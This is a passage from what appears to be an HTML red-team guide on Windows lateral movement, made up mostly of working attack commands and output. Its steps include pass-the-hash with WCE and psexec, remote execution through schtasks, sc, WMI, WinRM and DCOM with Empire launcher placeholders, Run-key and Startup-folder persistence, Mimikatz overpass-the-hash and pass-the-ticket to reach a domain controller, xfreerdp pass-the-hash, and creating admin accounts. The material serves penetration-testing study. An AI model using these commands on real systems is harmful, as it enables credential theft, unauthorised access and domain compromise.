<li>Embedded script is passed into memory via PowerShell’s Invoke-Expression (IEX)</li>
<li>Script creates a new service and passes stager payload into it</li>
<li>Metasploit payload handler receives payload and establishes session</li>
<li>Module cleans up after itself by tearing down the service</li>
</ul>
</div>
</div>
<div class="section" id="sysinternals-psexec">
<h3>Sysinternals psexec<a class="headerlink" href="#sysinternals-psexec" title="Permalink to this headline">¶</a></h3>
<p>Microsoft Sysinternal tool psexec can be downloaded from <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx">PsExec</a>. Mark has written a good article on how psexec works is <a class="reference external" href="http://windowsitpro.com/systems-management/psexec">PsExec Working</a>.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>psexec.exe \\Computername -u DomainName\username -p password &lt;command&gt;
command can be cmd.exe/ ipconfig etc.
</pre></div>
</div>
<div class="section" id="working-of-microsoft-psexec">
<h4>Working of Microsoft PSExec<a class="headerlink" href="#working-of-microsoft-psexec" title="Permalink to this headline">¶</a></h4>
<p>The below details are taken from Jonathan blog on <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a></p>
<p>At a high-level, the PsExec program works as follows:</p>
<ul class="simple">
<li>Connects to the hidden ADMIN$ share (mapping to the C:Windows folder) on the remote system via SMB</li>
<li>Utilizes the Service Control Manager (SCM) to start the PsExecsvc service and enable a named pipe on the remote system</li>
<li>Input/output redirection of the console is achieved via the created named pipe</li>
</ul>
</div>
<div class="section" id="sysinternal-psexec-with-hashes">
<h4>Sysinternal PSExec with hashes<a class="headerlink" href="#sysinternal-psexec-with-hashes" title="Permalink to this headline">¶</a></h4>
<p>Sysinternal PSExec is a tool built to assist system administrators. In order to use PsExec with captured hashes, we would require Windows Credential Editor (WCE).  This would require us to drop another executable to disk and risk detection. Fuzzynop has provided a tutorial <a class="reference external" href="http://fuzzynop.blogspot.in/2012/09/pass-hash-without-metasploit.html">Pass the Hash without Metasploit</a></p>
<ul class="simple">
<li>Change the current NTLM credentials</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>wce.exe -s &lt;username&gt;:&lt;domain&gt;:&lt;lmhash&gt;:&lt;nthash&gt;
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>C:\Users\test&gt;wce.exe -s testuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537

WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Changing NTLM credentials of current logon session (00024E1Bh) to:
Username: testuser
domain: amplialabs
LMHash: 01FC5A6BE7BC6929AAD3B435B51404EE
NTHash: 0CB6948805F797BF2A82807973B89537
NTLM credentials successfully changed!


C:\Users\test&gt;
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Run PSExec normally</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>psexec \\remotecomputer &lt;commandname&gt;
</pre></div>
</div>
<p>If you omit a user name, the process will run in the context of your account on the remote system, but will not have access to network resources (because it is impersonating). Specify a valid user name in the DomainUser syntax if the remote process requires access to network resources or to run in a different account. Since, we are omitting the username, it would run in the context of the current username ( The one we have changed with the help of WCE )</p>
</div></blockquote>
</div>
</div>
<div class="section" id="task-scheduler">
<h3>Task Scheduler<a class="headerlink" href="#task-scheduler" title="Permalink to this headline">¶</a></h3>
<p>If you are the administrator of the remote machine and using runas /netonly, we can utilize AT to run commands remotely. Using AT, a command to be run at designated time(s) as SYSTEM.</p>
<div class="section" id="examples">
<h4>Examples<a class="headerlink" href="#examples" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>AT \\REMOTECOMPUTERNAME 12:34 &quot;command to run&quot;
</pre></div>
</div>
<div class="highlight-None"><div class="highlight"><pre><span></span>AT \\REMOTECOMPUTERNAME 12:34 cmd.exe \c &quot;command to run&quot;

&quot;command to run&quot; can be web-delivery string or powershell empire string.
</pre></div>
</div>
<p>If we need to delete the AT jobs, we can use</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>AT \\REMOTECOMPUTERNAME id /delete /yes
</pre></div>
</div>
<p>However, sometimes doing it remotely, we need to figure out the time of the remote computer, we can utilize NET TIME</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>NET TIME \\REMOTECOMPUTERNAME
</pre></div>
</div>
</div>
</div>
<div class="section" id="scheduled-tasks">
<h3>Scheduled Tasks<a class="headerlink" href="#scheduled-tasks" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://technet.microsoft.com/en-us/library/cc725744(v=ws.11).aspx">Schtasks</a> Schedules commands and programs to run periodically or at a specific time. Adds and removes tasks from the schedule, starts and stops tasks on demand, and displays and changes scheduled tasks. Schtasks replaces At.exe, a tool included in previous versions of Windows. Although At.exe is still included in the Windows Server 2003 family, schtasks is the recommended command-line task scheduling tool.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>schtasks /create /sc &lt;ScheduleType&gt; /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; [/s &lt;Computer&gt; [/u [&lt;Domain&gt;\]&lt;User&gt; [/p &lt;Password&gt;]]] [/ru {[&lt;Domain&gt;\]&lt;User&gt; | System}] [/rp &lt;Password&gt;] [/mo &lt;Modifier&gt;] [/d &lt;Day&gt;[,&lt;Day&gt;...] | *] [/m &lt;Month&gt;[,&lt;Month&gt;...]] [/i &lt;IdleTime&gt;] [/st &lt;StartTime&gt;] [/ri &lt;Interval&gt;] [{/et &lt;EndTime&gt; | /du &lt;Duration&gt;} [/k]] [/sd &lt;StartDate&gt;] [/ed &lt;EndDate&gt;] [/it] [/z] [/f]

/sc &lt;ScheduleType&gt;               : Specifies the schedule type. Valid values are MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE.
/tn &lt;TaskName&gt;                   : Specifies a name for the task.
/tr &lt;TaskRun&gt;                    : Specifies the program or command that the task runs. Type the fully qualified path and file name of an executable file, script file, or batch file. If you omit the path, schtasks assumes that the file is in the SystemRoot\System32 directory.
/s &lt;Computer&gt;                    : Schedules a task on the specified remote computer. Type the name or IP address of a remote computer (with or without backslashes). The default is the local computer.
/u [&lt;Domain&gt;\]&lt;User&gt;             : Runs this command with the permissions of the specified user account. The default is the permissions of the current user of the local computer.
/p &lt;Password&gt;                    : Provides the password for the user account specified in the /u parameter. If you use the /u parameter, but omit the /p parameter or the password argument, schtasks prompts you for a password and obscures the text you type
/ru {[&lt;Domain&gt;\]&lt;User&gt; | System} : Runs the task with permissions of the specified user account. By default, the task runs with the permissions of the current user of the local computer, or with the permission of the user specified by the /u parameter, if one is included. The /ru parameter is valid when scheduling tasks on local or remote computers.
/rp &lt;Password&gt;                   : Provides the password for the user account that is specified in the /ru parameter. If you omit this parameter when specifying a user account, SchTasks.exe prompts you for the password and obscures the text you type. Do not use the /rp parameter for tasks run with System account credentials (/ru System). The System account does not have a password and SchTasks.exe does not prompt for one.
</pre></div>
</div>
<div class="section" id="id16">
<h4>Examples<a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Create new task and execute it</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System
schtasks /run /tn foobar /S host
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Delete the task after it is executed</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>schtasks /F /delete /tn foobar /S host
</pre></div>
</div>
</div></blockquote>
</div>
</div>
<div class="section" id="service-controller-sc">
<h3>Service Controller (SC)<a class="headerlink" href="#service-controller-sc" title="Permalink to this headline">¶</a></h3>
<p>Communicates with the Service Controller and installed services. SC.exe retrieves and sets control information about services. Armitage Hacker has mentioned this at his blog <a class="reference external" href="https://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/">Lateral Movement with High Latency</a></p>
<div class="section" id="create-a-new-service">
<h4>Create a new service<a class="headerlink" href="#create-a-new-service" title="Permalink to this headline">¶</a></h4>
<p>Create a new service named foobar</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>sc \\host create foobar binpath= “c:\windows\temp\foobar.exe”
</pre></div>
</div>
</div>
<div class="section" id="start-the-service">
<h4>Start the service<a class="headerlink" href="#start-the-service" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>sc \\host start foobar
</pre></div>
</div>
<p>The sc command requires an executable that responds to Service Control Manager commands. If you do not provide such an executable, your program will run, and then immediately exit.</p>
</div>
<div class="section" id="delete-the-service">
<h4>Delete the service<a class="headerlink" href="#delete-the-service" title="Permalink to this headline">¶</a></h4>
<p>Delete the service after it runs</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>sc \\host delete foobar
</pre></div>
</div>
</div>
</div>
<div class="section" id="remote-registry">
<h3>Remote Registry<a class="headerlink" href="#remote-registry" title="Permalink to this headline">¶</a></h3>
<p>A command to be run or DLL to be loaded when specific events occur, such as boot or login or process execution, as active user or SYSTEM.</p>
<p><strong>Examples</strong></p>
<div class="section" id="add-an-entry">
<h4>Add an entry<a class="headerlink" href="#add-an-entry" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>REG ADD \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t REG_SZ /d &quot;command to run&quot;
</pre></div>
</div>
<p>Command will run every time a user logs in as the user.</p>
</div>
<div class="section" id="query-the-remote-registry">
<h4>Query the remote registry<a class="headerlink" href="#query-the-remote-registry" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>REG QUERY \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry
</pre></div>
</div>
</div>
<div class="section" id="delete-the-remote-registry">
<h4>Delete the remote registry<a class="headerlink" href="#delete-the-remote-registry" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>REG DELETE \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry
</pre></div>
</div>
</div>
</div>
<div class="section" id="remote-file-access">
<h3>Remote File Access<a class="headerlink" href="#remote-file-access" title="Permalink to this headline">¶</a></h3>
<p>We can copy a launcher.bat file with powershell empire and drop it Startup folder, so that it executes every time a user logs in as a user.</p>
<div class="section" id="id17">
<h4>Example<a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>xcopy executabletorun.exe &quot;\\REMOTECOMPUTERNAME\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat&quot;
</pre></div>
</div>
</div>
</div>
<div class="section" id="winrm">
<h3>WinRM<a class="headerlink" href="#winrm" title="Permalink to this headline">¶</a></h3>
<p>Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it’s utilizing WMI, it can be thought of as an HTTP based API for WMI. WinRM will listen on one of two ports: 5985/tcp (HTTP) and 5986/tcp (HTTPS)</p>
<p>If one of these ports is open, WinRM is configured and you can try entering a remote session.</p>
<div class="section" id="enabling-ps-remoting">
<h4>Enabling PS-Remoting<a class="headerlink" href="#enabling-ps-remoting" title="Permalink to this headline">¶</a></h4>
<p>Configure the remote machine to work with WinRM. We need to run the below command from elevated powershell prompt</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\Windows\system32&gt; Enable-PSRemoting -Force
WinRM already is set up to receive requests on this machine.
WinRM has been updated for remote management.
Created a WinRM listener on HTTP://* to accept WS-Man requests to any IP on this machine.
WinRM firewall exception enabled.
</pre></div>
</div>
</div>
<div class="section" id="testing-the-winrm-connection">
<h4>Testing the WinRM Connection<a class="headerlink" href="#testing-the-winrm-connection" title="Permalink to this headline">¶</a></h4>
<p>We can use the Test-WSMan function to check if target is configured for WinRM. It should return information returned about the protocol version and wsmid</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; Test-WSMan XXXX-APPS03.example.com
wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 2.0
</pre></div>
</div>
</div>
<div class="section" id="adding-trusted-host-in-winrm">
<h4>Adding Trusted Host in WinRM<a class="headerlink" href="#adding-trusted-host-in-winrm" title="Permalink to this headline">¶</a></h4>
<p>Add Winrm Trusted Host in Windows</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>winrm set winrm/config/client @{TrustedHosts=&quot;RemoteComputerName&quot;}
</pre></div>
</div>
</div>
<div class="section" id="powershell-invoke-command">
<h4>PowerShell Invoke-Command<a class="headerlink" href="#powershell-invoke-command" title="Permalink to this headline">¶</a></h4>
<p>Execute commands using Powershell Invoke-Command on the target over WinRM.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; Invoke-Command -ComputerName XXXX-APPS03.xxx.example.com -ScriptBlock {ipconfig /all}

Windows IP Configuration

 Host Name . . . . . . . . . . . . : XXXX-Apps03
 Primary Dns Suffix  . . . . . . . : xxx.example.com
 Node Type . . . . . . . . . . . . : Hybrid
 IP Routing Enabled. . . . . . . . : No
 WINS Proxy Enabled. . . . . . . . : No
 DNS Suffix Search List. . . . . . : xxx.example.com
                                     example.com
</pre></div>
</div>
</div>
<div class="section" id="interactive-powershell-session">
<h4>Interactive PowerShell session<a class="headerlink" href="#interactive-powershell-session" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; Enter-PSSession -ComputerName XXXX-APPS03.xxx.example.com
[XXXX-APPS03.xxx.example.com]: PS C:\Users\dummyuser\Documents&gt; whoami
example.com\dummyuser
</pre></div>
</div>
<p>The above commands are executed using runas /netonly if you want to run it with the credentials we can use</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>-credential domainname\username switch
</pre></div>
</div>
</div>
<div class="section" id="disable-powershell-remoting">
<h4>Disable Powershell Remoting<a class="headerlink" href="#disable-powershell-remoting" title="Permalink to this headline">¶</a></h4>
<p>Also, if you want to disable the psremoting/ WinRM, you can utilize <a class="reference external" href="https://msdn.microsoft.com/en-us/powershell/reference/4.0/microsoft.powershell.core/disable-psremoting">Disable-PSRemoting</a> . However, if you get</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\Windows\system32&gt; Disable-PSRemoting
WARNING: Disabling the session configurations does not undo all the changes made by the Enable-PSRemoting or
Enable-PSSessionConfiguration cmdlet. You might have to manually undo the changes by following these steps.
    1. Stop and disable the WinRM service.
    2. Delete the listener that accepts requests on any IP address.
    3. Disable the firewall exceptions for WS-Management communications.
    4. Restore the value of the LocalAccountTokenFilterPolicy to 0, which restricts remote access to members of the Administrators group on the computer.
</pre></div>
</div>
<p>then follow the <a class="reference external" href="https://blogs.technet.microsoft.com/bshukla/2011/04/27/how-to-revert-changes-made-by-enable-psremoting/">How to revert changes made by Enable-PSRemoting?</a></p>
<p>Scott Sutherland has written <a class="reference external" href="https://blog.netspi.com/powershell-remoting-cheatsheet/">PowerShell Remoting Cheatsheet</a> which can be referred too.</p>
</div>
</div>
<div class="section" id="id18">
<h3>WMI<a class="headerlink" href="#id18" title="Permalink to this headline">¶</a></h3>
<p>As per the TechNet article <a class="reference external" href="https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx">Windows Management Instrumentation</a> (WMI) is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers.</p>
<div class="section" id="local-code-execution">
<h4>Local code execution<a class="headerlink" href="#local-code-execution" title="Permalink to this headline">¶</a></h4>
<p>WMI Process Create: The Win32_Process class can be called via WMI to query, modify, terminate, and create running processes.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>wmic path win32_process call create &quot;calc.exe&quot;
Executing (win32_process)-&gt;create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
      ProcessId = 2616;
      ReturnValue = 0;
};
</pre></div>
</div>
<p>The command returns the ProcessID and the ReturnValue (0 abcning no errors)</p>
</div>
<div class="section" id="remote-code-execution">
<h4>Remote code execution<a class="headerlink" href="#remote-code-execution" title="Permalink to this headline">¶</a></h4>
<p>We can use runas command to authenticate as a different user and then execute commands using wmic or use</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>wmic /node:computername /user:domainname\username path win32_process call create &quot;**empire launcher string here**&quot;
</pre></div>
</div>
<p>instead of computername, we can specify textfile containing computernames and specify using wmic /node:&#64;textfile</p>
<p>Refer Rop-Nop blog <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part3: Wmi and winrm</a></p>
</div>
</div>
<div class="section" id="dcom">
<h3>DCOM<a class="headerlink" href="#dcom" title="Permalink to this headline">¶</a></h3>
<p>The below is as per my understanding (I might be wrong), if so, please do correct me. After reading <a class="reference external" href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">Lateral Movement Using the MMC20.Application COM Object</a> and <a class="reference external" href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">Lateral Movement Via DCOM Round 2</a> I believe there are three ways to do lateral movement by using DCOM</p>
<div class="section" id="dcom-applications-via-mmc-application-class-mmc20-application">
<h4>DCOM applications via MMC Application Class (MMC20.Application)<a class="headerlink" href="#dcom-applications-via-mmc-application-class-mmc20-application" title="Permalink to this headline">¶</a></h4>
<p>This COM object allows you to script components of MMC snap-in operations. there is a method named “ExecuteShellCommand” under Document.ActiveView.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;IPAddress&quot;))
PS C:\&gt; $com.Document.ActiveView.ExecuteShellCommand(&quot;C:\Windows\System32\calc.exe&quot;,$null,$null,7)
</pre></div>
</div>
<p>For Empire</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>$com.Document.ActiveView.ExecuteShellCommand(&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;,$null,&quot;-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; &quot;,&quot;7&quot;)
</pre></div>
</div>
<p>Tanoy has written a simple wrapper/ function <a class="reference external" href="https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1">Invoke-MMC20RCE.ps1</a> which might be useful.</p>
</div>
<div class="section" id="dcom-via-shellexecute">
<h4>DCOM via ShellExecute<a class="headerlink" href="#dcom-via-shellexecute" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>$com = [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;IPAddress&quot;)
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;C:\windows\system32&quot;,$null,0)
^ The above should run a calc
</pre></div>
</div>
</div>
<div class="section" id="dcom-via-shellbrowserwindow">
<h4>DCOM via ShellBrowserWindow<a class="headerlink" href="#dcom-via-shellbrowserwindow" title="Permalink to this headline">¶</a></h4>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Windows 10 Only, the object doesn’t exists in Windows 7</p>
</div>
<div class="highlight-None"><div class="highlight"><pre><span></span>$com = [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;IPAddress&quot;)
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;C:\windows\system32&quot;,$null,0)
^ The above should run a calc
</pre></div>
</div>
<p>All the above three method, assumes that either you are running the commands as administrator of the remote machine. And you have achieved it either by using runas /netonly or logging in as that user.</p>
<p>While executing the above if you get the below error, it means, we do not have access to execute object remotely which results in “Access Denied”:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>$com = [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;IPAddress&quot;)
$obj = [System.Activator]::CreateInstance($com)
Exception calling &quot;CreateInstance&quot; with &quot;1&quot; arguement(s) &quot;Retrieving the COM class factory for remote component with CLSID {} from machine IPAddress failed due to the following error 80070005.

At line:1 char:1
+ $obj = [System.Activator]::CreateInstance($com)
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  +CategoryInfo             : NotSpecified: (:), MethodInvocationException
  +FullyQualifiedErrorID    : UnauthorizedAccessException
</pre></div>
</div>
</div>
</div>
<div class="section" id="mimikatz-pth-ptt">
<h3>Mimikatz PTH/ PTT<a class="headerlink" href="#mimikatz-pth-ptt" title="Permalink to this headline">¶</a></h3>
<p>Microsoft <a class="reference external" href="https://gallery.technet.microsoft.com/Advanced-Threat-Analytics-8b0a86bc">Advanced Threat Analytics Attack Simulation Playbook</a> has provided examples for Mimikatz PTH, PTT.</p>
<p>If we do not have plaintext credentials, we can use NTLM hashes to get a shell</p>
<div class="section" id="pass-the-hash">
<h4>Pass the Hash<a class="headerlink" href="#pass-the-hash" title="Permalink to this headline">¶</a></h4>
<p>Using a technique called Overpass-the-Hash we can take the NTLM hash and use it to obtain a Ticket Granting Ticket (TGT) via Kerberos\ Active Directory. With a TGT you can masquerade as the administrative user and access any domain resource that admin user has access to.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntlm hash] /domain:[domainname]” “exit”
</pre></div>
</div>
<p>A new command prompt session opens. This new command prompt injected Admin user credentials into it!</p>
<p>This can be verified by checking</p>
<ul class="simple">
<li>If we have access to the C drive of the remote machine</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>dir \\remote-machine\c$
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Inspect tickets in Overpass-the-hash command prompt: From the new command prompt that opened from the Overpass-the-hash attack, execute the following:</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>klist
</pre></div>
</div>
</div></blockquote>
<p>We should be able to see the ticket of the admin user.</p>
</div>
<div class="section" id="pass-the-ticket">
<h4>Pass the ticket<a class="headerlink" href="#pass-the-ticket" title="Permalink to this headline">¶</a></h4>
<p>Let’s assume, we got credentials of Local Admin A, by which we can login in to the machine on which Domain Admin is logged on. We would utilize pass the ticket for this</p>
<ul class="simple">
<li>Harvest Credentials</li>
<li>Execute Mimikatz against Admin-PC ( on which domain admin is logged on )</li>
</ul>
<blockquote>
<div><p>From the new command prompt, running in the context of admin user, go to the part of the filesystem where Mimikatz is located from that library. Run the following commands:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>xcopy mimikatz \\admin-pc\c$\temp
</pre></div>
</div>
<p>Next, execute MimiKatz remotely to export all Kerberos tickets from Admin-PC:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>psexec.exe \\admin-pc -accepteula cmd /c (cd c:\temp ^&amp; mimikatz.exe “privilege::debug”   “sekurlsa::tickets /export” ^&amp; “exit”)
</pre></div>
</div>
<p>Copy these tickets back to Victim-PC:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>xcopy \\admin-pc\c$\temp c:\temp\tickets
</pre></div>
</div>
<p>We successfully executed Mimikatz remotely, exporting all Kerberos tickets from Admin-PC. We copied back the results to Victim-PC, and now has one of the Domain Admin credentials without having to exploit his computer!</p>
</div></blockquote>
<ul class="simple">
<li>Locate the Domain Admin user TGT</li>
</ul>
<blockquote>
<div>Locate the kirbi files which are not Domain Admin user (i.e. “ADMIN-PC$”). Delete those and keep the Domain Admin user tickets.</div></blockquote>
<ul class="simple">
<li>Pass-the-Ticket</li>
</ul>
<blockquote>
<div><p>We can pass the Domain Admin User tickets, literally, into memory and use them to gain access to resources as if you were Domain Admin. The attacker is ready to import them into Victim-PC’s memory, to get the credentials to access sensitive resources.</p>
<p>From an elevated command prompt, where Mimikatz is located on the filesystem, execute the following:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>mimikatz.exe “privilege::debug” “kerberos::ptt c:\temp\tickets” “exit”
</pre></div>
</div>
<p>Ensure that the <a class="reference external" href="mailto:DomainAdminUser&#37;&#52;&#48;krbtgt-Domainname">DomainAdminUser<span>&#64;</span>krbtgt-Domainname</a> tickets were successfully imported. Now, let’s validate that the right tickets are in the command prompt session.</p>
</div></blockquote>
<ul class="simple">
<li>Validate the ticket was imported</li>
</ul>
<blockquote>
<div><p>Execute the following in the same elevated command prompt:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>klist
</pre></div>
</div>
<p>The attacker now successfully imported the harvested ticket into the session, and will now leverage their new privilege and access to access the domain controller’s C drive</p>
</div></blockquote>
<ul class="simple">
<li>Access contents of dc1c$ with DomainAdminUser credential</li>
</ul>
<blockquote>
<div><p>Execute the following in the same command prompt to which the tickets were just imported.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>dir \\dc1\c$
</pre></div>
</div>
<p>The attacker is now, for all intents and purposes, DomainAdminUser, in the digital world. Only administrators should be able to access the root of the domain controller. The attacker is using legitimate credentials, can access legitimate resources and executing legitimate executables.</p>
</div></blockquote>
</div>
</div>
<div class="section" id="xfreerdp-remote-desktop">
<h3>xfreerdp/ Remote Desktop<a class="headerlink" href="#xfreerdp-remote-desktop" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rdesktop">
<h4>rdesktop<a class="headerlink" href="#rdesktop" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>rdesktop IPAddress
</pre></div>
</div>
<p>Remote Desktop with 90% Screen</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>rdesktop -g 90%
rdesktop -f : for Full screen. Fullscreen mode can be toggled at any time using Ctrl-Alt-Enter.
</pre></div>
</div>
</div>
<div class="section" id="pass-the-hash-with-remote-desktop">
<h4>Pass the Hash with Remote Desktop<a class="headerlink" href="#pass-the-hash-with-remote-desktop" title="Permalink to this headline">¶</a></h4>
<p>If we have a hash of a user, we can use xfreerdp to have remote desktop</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>xfreerdp /u:user /d:domain /pth:hash /v:IPAddress
</pre></div>
</div>
<p>More information refer <a class="reference external" href="https://www.kali.org/penetration-testing/passing-hash-remote-desktop/">Passing the Hash with Remote Desktop</a></p>
<div class="admonition-todo admonition" id="index-0">
<p class="first admonition-title">Todo</p>
<p class="last">—-dsquery !! SubMSI ? MSUtil to use RCE?
—-Any commands if net, or powershell is blocked? or PV/ BH is caught?</p>
</div>
</div>
</div>
</div>
<div class="section" id="useful-stuff">
<span id="id19"></span><h2>Useful Stuff<a class="headerlink" href="#useful-stuff" title="Permalink to this headline">¶</a></h2>
<div class="section" id="add-remove-a-local-user">
<h3>Add/ remove/ a local user<a class="headerlink" href="#add-remove-a-local-user" title="Permalink to this headline">¶</a></h3>
<div class="highlight-None"><div class="highlight"><pre><span></span>net user /add [username] [password]
</pre></div>
</div>
<div class="highlight-None"><div class="highlight"><pre><span></span>net user John xxxxxxxxx /ADD

C:\&gt;net user /add John *
Type a password for the user:
Retype the password to confirm:
The command completed successfully.
</pre></div>
</div>
</div>
<div class="section" id="add-a-domain-user">
<h3>Add a domain user<a class="headerlink" href="#add-a-domain-user" title="Permalink to this headline">¶</a></h3>
<div class="highlight-None"><div class="highlight"><pre><span></span>net user username password /ADD /DOMAIN
</pre></div>
</div>
</div>
<div class="section" id="add-remove-a-local-user-to-administrator-group">
<h3>Add / remove a local user to administrator group<a class="headerlink" href="#add-remove-a-local-user-to-administrator-group" title="Permalink to this headline">¶</a></h3>
<div class="highlight-None"><div class="highlight"><pre><span></span>net localgroup administrators [username] /add
</pre></div>
</div>
<div class="section" id="change-local-user-password">
<h4>Change local user password<a class="headerlink" href="#change-local-user-password" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>net user username newpassword
</pre></div>
</div>
</div>
</div>
<div class="section" id="accessing-remote-machines">
<h3>Accessing Remote machines<a class="headerlink" href="#accessing-remote-machines" title="Permalink to this headline">¶</a></h3>
<div class="section" id="windows">
<h4>Windows<a class="headerlink" href="#windows" title="Permalink to this headline">¶</a></h4>
<p>Setup an SMB connection with a host</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; net use \\DC.xxxxxxxx.net
The command completed successfully.
</pre></div>
</div>
<p>Check for access to admin shares (“C$”, or “ADMIN$”), if we are admin:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; dir \\DC.xxxxxxxxxx.net\C$\Users

Directory: \\DC.xxxxxxxx.net\C$\Users

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----        20.11.2016     09:35            axx.xxxxxx
d----        21.11.2010     06:47            Administrator
d-r--        14.07.2009     06:57            Public
</pre></div>
</div>
<p>If we are not admin, we might get access denied:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; dir \\DC.xxxxxxxxxx.net\C$\Users
Access is denied.
</pre></div>
</div>
<p>Check your net connections:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:&gt; net use
New connections will be remembered.

Status       Local     Remote                    Network

